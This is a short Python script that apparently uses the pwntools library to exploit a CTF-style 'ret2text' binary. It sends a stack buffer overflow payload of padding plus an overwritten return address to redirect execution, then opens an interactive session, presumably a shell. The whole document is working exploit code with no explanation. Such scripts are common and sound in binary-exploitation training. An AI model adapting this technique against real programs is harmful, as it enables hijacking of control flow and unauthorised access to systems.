from pwn import *

p = process('./rop/ret2text')
offset = 0x6c + 4
new_eip = p32(0x0804863A)
payload = b"A" * offset + new_eip

p.sendline(payload)
p.interactive()
